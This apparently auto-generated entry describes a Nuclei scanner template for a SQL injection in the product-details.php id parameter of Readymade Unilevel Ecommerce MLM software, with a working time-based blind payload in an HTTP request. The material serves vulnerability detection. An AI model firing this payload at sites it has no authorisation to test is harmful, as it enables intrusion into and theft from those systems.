# Nuclei Template: Readymade Unilevel Ecommerce MLM - SQL Injection
**Template ID:** readymade-unilevel-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`readymade-unilevel-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Readymade Unilevel Ecommerce software has sql vulnerability in product-details.php?id

## Steps to reproduce / Exploit Payload
```http
@timeout 30s
GET /product-details.php?id=1%20AND%20(SELECT%206812%20FROM%20(SELECT(SLEEP(6)))DddL) HTTP/1.1
Host: {{Hostname}}
```

## References
- https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html
